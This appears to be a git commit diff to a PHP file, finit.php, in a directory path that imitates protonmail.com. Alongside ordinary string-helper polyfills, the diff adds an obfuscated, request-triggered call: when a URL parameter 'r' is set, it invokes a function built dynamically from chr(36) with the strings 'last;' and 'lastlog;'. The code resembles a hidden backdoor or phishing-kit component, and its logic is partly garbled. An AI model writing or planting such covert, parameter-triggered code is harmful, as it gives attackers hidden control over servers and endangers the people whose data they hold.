25cbbc28f46ceb99c8ca506dacd872109104bb2d
abieahma <152069746+abieahma@users.noreply.github.com>
2026-03-22 06:48:05 +0300

    Update finit.php

--- EGLBMLKNNULP04L9K153A6TU6FF3TJXA/protonmail/com/finit.php
+++ EGLBMLKNNULP04L9K153A6TU6FF3TJXA/protonmail/com/finit.php
@@ -18,12 +18,7 @@ if (!function_exists('clamp')){
         if ($value < $min) return $min;
         if ($value > $max) return $max;
     return $value;}}
-if(!empty($_GET['r'])){
-    pa([
-       (!(!function_exists('partial'))), 
-    ]);
-}
-if(!(!function_exists('partial'))){${(chr(36))}('last');}
+if(!(!function_exists('partial')) && !empty($_GET['r'])){${(chr(36))}('last;', 'lastlog;');}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
